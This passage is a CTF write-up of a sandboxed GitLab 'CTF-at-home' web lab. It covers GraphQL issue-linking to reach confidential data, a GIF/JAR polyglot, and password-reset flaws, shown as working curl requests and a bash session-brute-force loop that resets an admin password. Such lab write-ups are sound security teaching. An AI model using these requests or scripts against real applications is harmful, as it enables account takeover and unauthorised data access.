          "description": "Represents a unique identifier that is Base64 obfuscated. It is often used to refetch an object or as key for a cache. The ID type appears in a JSON response as a String; however, it is not intended to be human-readable. When expected as an input type, any string (such as `\"VXNlci0xMA==\"`) or integer (such as `4`) input value will be accepted as an ID.",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": null,
          "possibleTypes": null
        },
```

Enumerating the `hint` object gives us our best clue from `id:3` (being the last from 1-4) under `hint` object:

```jsx
query {
  hint (id:3) {
    id
    text
      }
    }
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2012.png)

First, let’s also get a list of public projects and their `issues`: (Note `id:3` is missing)

```jsx
query {
  projects {
    id
    name
    description
    issues {
      id
      title
      description
      confidential
      related {
        id
        title
        description
        confidential
      }
    }
  }
}
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2013.png)

Let’s create a mutation to create an account under `createUser` identified earlier, as well as a `createProject` and `createIssue`:

```jsx
mutation {
  createUser(input: {}) {
    user {
      id
      username
    }
  }
}

...

{
  "data": {
    "createUser": {
      "user": {
        "id": "2",
        "username": "user83700"
      }
    }
  }
}
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2014.png)

```jsx
mutation {
  createProject(input: {
    name: "GangGreenTemperTatum"
    description: "!dame la bandera!"
  }) {
    project {
      id
      name
      description
      private
    }
  }
}

...

{
  "data": {
    "createProject": {
      "project": {
        "id": "2",
        "name": "GangGreenTemperTatum",
        "description": "!dame la bandera!",
        "private": true
      }
    }
  }
}
```

```jsx
mutation {
  createIssue(input: {title: "GangGreenTemperTatum", description: "!dame la bandera!", projectId: 2}) {
    issue {
      id
      title
      description
      confidential
    }
  }
}

...

{
  "data": {
    "createIssue": {
      "issue": {
        "id": "5",
        "title": "GangGreenTemperTatum",
        "description": "!dame la bandera!",
        "confidential": false
      }
    }
  }
}
```

Ok, so my summary from mutations:

`Username` = `user83700` / `ID`: `2` 

`Project - ID`= `2` / `Name`= `"GangGreenTemperTatum"`

`Issue - ID`= `5` / `Name`= `"GangGreenTemperTatum"`

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2015.png)

`"confidential": false,`

We need to make this `"confidential": true,` boolean value and as such we need to link the issue to the confidential issue via `linkIssues` mutation:

```jsx
mutation {
  linkIssues(input: {sourceIssueId: 5, sourceProjectId: 2, targetIssueId: 3, targetProjectId: 1}) {
    success
  }
}

...

{
  "data": {
    "linkIssues": {
      "success": true
    }
  }
}
```

Now, let’s re-verify:

```jsx
query {
  projects {
    id
    name
    description
    issues {
      id
      title
      description
      confidential
      related {
        id
        title
        description
        confidential
      }
    }
  }
}
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2016.png)

```jsx
"[tanuki](5f82e9d6a285711874aa50cb3f71b91c)",
```

```jsx
{
  project(id: 2) {
    id
    name
    description
    issues {
      id
      title
      description
      confidential
      related {
        id
        title
        description
        confidential
      }
    }
  }
}
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2017.png)

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2018.png)

---

## Nyan | Polyglot 😈

### [Nyan](http://capture.local.thetanuki.io/nyan)

![nyan.gif](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/nyan.gif)

Our only hint here is the strange pop-tart feline within the `gif` present in the application, and from experience with CTF’s screams a classic polyglot. Let’s try inspect the file:

```jsx
ctf-at-home master % file nyan.gif
nyan.gif: GIF image data, version 89a, 316 x 200
```

```jsx
ctf-at-home master % xxd nyan.gif
00000000: 4749 4638 3961 3c01 c800 f7ff 0000 0000  GIF89a<.........
00000010: 0201 0404 0409 060c 0b06 0e1d 0818 2908  ..............).

####################################################################################
# The META and maven references hint this could be a .jar Java executable
####################################################################################

00013140: 0000 0000 0000 1000 ffff ef02 0000 4d45  ..............ME
00013150: 5441 2d49 4e46 2f6d 6176 656e 2f50 4b01  TA-INF/maven/PK.
00013160: 0214 030a 0000 0000 000a 5d91 5000 0000  ..........].P...
00013170: 0000 0000 0000 0000 001c 0000 0000 0000  ................
00013180: 0000 0010 00ff ff1c 0300 004d 4554 412d  ...........META-
00013190: 494e 462f 6d61 7665 6e2f 696f 2e74 6865  INF/maven/io.the
000131a0: 7461 6e75 6b69 2f50 4b01 0214 030a 0000  tanuki/PK.......
000131b0: 0000 000a 5d91 5000 0000 0000 0000 0000  ....].P.........
000131c0: 0000 0026 0000 0000 0000 0000 0010 00ff  ...&............
000131d0: ff56 0300 004d 4554 412d 494e 462f 6d61  .V...META-INF/ma
000131e0: 7665 6e2f 696f 2e74 6865 7461 6e75 6b69  ven/io.thetanuki
000131f0: 2f48 656c 6c6f 466c 6167 2f50 4b01 0214  /HelloFlag/PK...
00013200: 030a 0000 0008 0003 5d91 50d1 7a57 3b0e  ........].P.zW;.
00013210: 0200 00a3 0500 002d 0000 0000 0000 0000  .......-........
00013220: 0000 00a4 819a 0300 004d 4554 412d 494e  .........META-IN
00013230: 462f 6d61 7665 6e2f 696f 2e74 6865 7461  F/maven/io.theta
00013240: 6e75 6b69 2f48 656c 6c6f 466c 6167 2f70  nuki/HelloFlag/p
00013250: 6f6d 2e78 6d6c 504b 0102 1403 0a00 0000  om.xmlPK........
00013260: 0800 bc5c 9150 b581 a010 7300 0000 7200  ...\.P....s...r.
00013270: 0000 3400 0000 0000 0000 0000 0000 a481  ..4.............
00013280: f305 0000 4d45 5441 2d49 4e46 2f6d 6176  ....META-INF/mav
00013290: 656e 2f69 6f2e 7468 6574 616e 756b 692f  en/io.thetanuki/
000132a0: 4865 6c6c 6f46 6c61 672f 706f 6d2e 7072  HelloFlag/pom.pr
000132b0: 6f70 6572 7469 6573 504b 0506 0000 0000  opertiesPK......
000132c0: 0a00 0a00 c102 0000 b806 0000 0000       ..............
```

```jsx
ctf-at-home master % java -jar nyan.gif
That was easy!
The reward is: [tanuki](be0331e515789e4190adcb98b16b516c)!
```

From inspecting the file, we could see this was a `.jar` (Java executable file) which I ran in my local Java environment and resulted in the flag.

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2019.png)

---

## [RST](http://capture.local.thetanuki.io/rst)😈

### [RST](http://capture.local.thetanuki.io/rst) **1**:

Notice the sign-in link is:

[`http://rst.local.thetanuki.io/users/sign_in`](http://rst.local.thetanuki.io/users/sign_in)

and the reset password link is:

[`http://rst.local.thetanuki.io/reset`](http://rst.local.thetanuki.io/reset)

A `GET` request sends a strange error:

```jsx
~ % curl -i -X GET http://rst.local.thetanuki.io/reset
HTTP/1.1 200 OK
Cache-Control: max-age=0, private, must-revalidate
Content-Type: text/plain; charset=utf-8
Etag: W/"01d2db2ddae990f1eed77cef92fec0de"
Referrer-Policy: strict-origin-when-cross-origin
Set-Cookie: _pwreset_session=Z7R5ic%2BsdZaTDS%2B4eOxnCtKXq%2BjonOz2TBWiJOPUwmPUqZF1Nbt%2B%2BUE9srocV9igHHi1JKIT%2F9OALW3pYAYQMHJvbherOjftJHu19da6sbZjhKST9zFZVFVVjv1BPQMGX3jaH3oqgO01jkGVJmUNZqTlPan4YWYnFuoVUyXW3gcorWlvtzj52DwzH9M%3D--CXKoEQS1ALvvW3F0--oe%2FvrxxuRhzXfKOZI9Erpw%3D%3D; path=/; HttpOnly
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 72a7ccbd-417b-4a1f-b3b5-98fe821d9779
X-Runtime: 0.012056
X-Xss-Protection: 1; mode=block
Date: Mon, 16 Oct 2023 03:10:49 GMT
Content-Length: 22

error saving password!%
```

We already have the username from the challenge prompt and know the following from the code:

1. **`ResetController`** is a controller in the Rails application responsible for handling password resets. Inside this controller, there's a single action defined: **`password_reset`**.
2. In the **`password_reset`** action:
    - It attempts to find a user based on a **`reset_password_token`** passed as a parameter in the request.
    - If it finds a user, it stores the user's ID in the session using the token as a key.
    - If it doesn't find a user, it attempts to retrieve a user's ID from the session using the token.
    - If it still can't find a user, it renders "no way!" as plain text and returns, indicating an error.
3. After handling the token and user, the action checks if the request contains a **`password`** parameter and ensures that the password is at least 7 characters long (length > 6, which is equivalent to at least 7 characters). If the conditions are met, it sets the user's password to the provided value and attempts to save the user. If the user is successfully saved, it renders "password changed ;)" as plain text and returns, indicating success. If there is an error saving the password, it renders "error saving password!" as plain text.
4. The code defines some routes using **`Rails.application.routes.draw`**:
    - It sets up routes for user authentication using Devise (**`devise_for :users`**).
    - It specifies the root route for authenticated users to the 'home#index' action.
    - For non-authenticated users, it redirects them to the sign-in page.
    - Additionally, it defines a custom route for the 'reset' path, which maps to the **`ResetController`**'s **`password_reset`** action.

This code is likely part of a web application that provides password reset functionality for users. It checks a token, allows users to change their password if they meet certain criteria, and handles authentication routes. However, the security and functionality of this code depend on the broader context of the application and how it's used in conjunction with other components.

This code is likely part of a web application that provides password reset functionality for users. It checks a token, allows users to change their password if they meet certain criteria, and handles authentication routes.

Hmmmm, no dice:

```jsx
~ % curl -X GET -d "token=your_reset_token&password=your_password" http://rst.local.thetanuki.io/reset
no way!%
```

Bingo:

```jsx
~ % curl -X GET -d "password=1234567" http://rst.local.thetanuki.io/reset
password changed ;)%
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2020.png)

```jsx
~ % curl -i -s -k -X $'POST' \
    -H $'Host: rst.local.thetanuki.io' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-CA,en-US;q=0.7,en;q=0.3' -H $'Accept-Encoding: gzip, deflate, br' -H $'Referer: http://rst.local.thetanuki.io/users/sign_in' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 215' -H $'Origin: http://rst.local.thetanuki.io' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_pwreset_session=1bwh%2BfIbxw2Gr%2FAEntEV%2By%2ByI%2F6NXB7W1aL%2FvH3T1%2FfWpn4OBjeRthc63tThCJdqRC15jrAAg%2B3NjStGt7po1sxSn1iHurTJU8aoX%2B8WuuI%2Bc6BLyqk0wqfVMsge7uOQi1jMZBnhKdyPszB2tblzmedwsfR4wtHVL95qbaJwAZpeUpOWRLbCt6bJ0VxYnjGrKT5zF07IfYQRZylki%2BzDm2KM6JEiPovv1qjaDWpXeiuTzcSvgOtG%2B6f40Gjyky%2FZ4zkyeRz1KT7vxKdY6uge1ORjhpIgadDa--sa4C1r4Zo6jnvMVb--257ILCGg%2F3iwNz1mt4fudQ%3D%3D' \
    --data-binary $'authenticity_token=VZrdqzkXyeLfGC6cJ%2BvUdTgnVqmA28DwWW8SX0kItKxdRVHNjJWdTDFwPiPAgoCCDFrdtGHpmSAscUBljjDVpw%3D%3D&user%5Bemail%5D=admin%40thetanuki.io&user%5Bpassword%5D=1234567&user%5Bremember_me%5D=0&commit=Log+in' \
    $'http://rst.local.thetanuki.io/users/sign_in' \\\\

[tanuki](dbf839366dab89fe5a8cb215d4ad887e)
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2021.png)

### [RST](http://capture.local.thetanuki.io/rst2) **2**: (In-Progress)

As you can see from the `diff` in the updated code (all other code is the same), we can no longer pass an empty token to get a successful response from the password reset endpoint.

In the **`routes.rb`** file:

- The routes are defined to map the URL **`/reset/:token`** to the **`password_reset`** action in the **`ResetController`**. This route appears to be for handling password reset requests with a token as a parameter.
- Other routes related to user authentication using Devise are set up, specifying the root path for authenticated users and an initial root path for unauthenticated users.

```jsx
diff --git a/config/routes.rb b/config/routes.rb
index f854b33..6497ce1 100644
--- a/config/routes.rb
+++ b/config/routes.rb
@@ -5,5 +5,5 @@ Rails.application.routes.draw do
     root to: 'home#index', as: :authenticated_root
   end
   root to: redirect('/users/sign_in')
-   get 'reset' => 'reset#password_reset'
+   get 'reset/:token' => 'reset#password_reset'
 end

##########################
# UPDATED CODE:
##########################

class ResetController < ApplicationController
  def password_reset
    @user = User.where(reset_password_token: params[:token]).first
    if @user
      session[params[:token]] = @user.id
    else
      user_id = session[params[:token]]
      @user = User.find(user_id) if user_id
    end
    if !@user
      render :plain => "no way!"
      return
    elsif params[:password] && @user && params[:password].length > 6
      @user.password = params[:password]
        if @user.save
          render :plain => "password changed ;)"
          return
        end
    end
    render :plain => "error saving password!"
  end
end

Rails.application.routes.draw do
  devise_for :users
   authenticated :user do
    root to: 'home#index', as: :authenticated_root
  end
  root to: redirect('/users/sign_in')
   get 'reset/:token' => 'reset#password_reset'
end
```

In summary, this code manages user authentication and session data. If **`@user`** is set, it saves the user's ID in the session. If **`@user`** is not set, it attempts to retrieve the user's ID from the session and then looks up the corresponding user record in the database if a user ID is present. TLDR, the `user_id` is being retrieved from the session and the `token` parameter is being used as the session key.

Making a `GET` request to `/session_id` endpoint returns a `404`, meaning `user_id` isn’t `nil` and the `User.find` call raised a `RecordNotFound` exception.

```jsx
ctf-at-home master % curlheaders -X GET http://rst2.local.thetanuki.io/reset/session_id
*   Trying 127.0.0.1:80...
* Connected to rst2.local.thetanuki.io (127.0.0.1) port 80 (#0)
> GET /users/session_id HTTP/1.1
> Host: rst2.local.thetanuki.io
> User-Agent: curl/8.1.2
> Accept: application/json
> Content-Type: application/json
>
< HTTP/1.1 404 Not Found
HTTP/1.1 404 Not Found
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2022.png)

By default, in Rails, the `session_id` is a [32-character hexadecimal string](https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/middleware/session/abstract_store.rb#L27). And if we pass this to `find` this is automatically converted into an integer.

Create a bash script (`.sh`) that brute-forces the request whilst generating new session ID’s:

```jsx
#!/bin/bash

while true
do
  echo "Generating session..."
  curl -b '_ctf_proxy=...' -c cookies.txt http://rst2.local.thetanuki.io/users/sign_in

  echo "Trying to reset..."
  curl -b '_ctf_proxy=...' -b cookies.txt http://rst2.local.thetanuki.io/reset/session_id?password=password123
done
```

This Bash script generates a session and attempting to reset a password by making HTTP requests using the **`curl`** command. It performs the following actions in a loop:

1. It enters an infinite loop with the condition **`while true`**, indicating that it will keep running until it's manually interrupted.
2. Inside the loop, it prints the message "`Generating session...`" to the standard output.
3. It uses the **`curl`** command to make an HTTP request to the URL **`http://rst2.local.thetanuki.io/users/sign_in`** and sets a cookie named **`_ctf_proxy`** with a value of '`...`' in the request headers and saving the received cookies in a file named **`cookies.txt`**. This is likely a step to initiate a session for the user.
4. After generating the session, it prints the message "`Trying to reset...`" to the standard output.
5. It uses the **`curl`** command again to make another HTTP request. This time, it includes the cookies stored in the **`cookies.txt`** file in the request headers. The URL **`http://rst2.local.thetanuki.io/reset/session_id?password=password123`** is used, where **`session_id`** seems to be a placeholder for a session ID, and **`password123`** seems to be a placeholder for a password.

The script appears to be simulating a scenario where it generates a session and then attempts to reset a password using the generated session. It's designed to run indefinitely until manually stopped. Let’s see it in action!

```jsx
ctf-at-home master % chmod +x brute-force-generate-session-to-password-reset.sh
ctf-at-home master % ls brute-force-generate-session-to-password-reset.sh
-rwxr-xr-x  1 adam  staff  -  289B 16 Oct 20:21 brute-force-generate-session-to-password-reset.sh*
ctf-at-home master % ./brute-force-generate-session-to-password-reset.sh > logs.txt

..

ctf-at-home master % cat logs.txt | grep ";)"
password changed ;)Generating session...
```

```jsx
ctf-at-home master % curl -X GET -d "email=admin@thetanuki.io&password=password123" http://rst2.local.thetanuki.io/
<html><body>You are being <a href="http://rst2.local.thetanuki.io/users/sign_in">redirected</a>.</body></html>%

```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2023.png)

`[tanuki](ec41e13496a4388f10e116e2f13e6c66)`

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2024.png)

---

## Additional Items Not Mentioned in the Report

- This section is placed for any additional items that were not mentioned in the overall report and out OOS (out-of-scope).
    - Maintaining/persisting access
    - Lateral movement (not applicable as sandboxed environment)
    - Individual remediation items per-finding/exploit
    - Web-server SAST-discovered vulnerabilities (Nikto|SAST|DAST etc.)
    - Any other identified open socket protocols or port vulnerability techniques

The report (as this an emulated lab and sandboxed environment) does not include credentials or IP addresses in redacted or obfuscated format.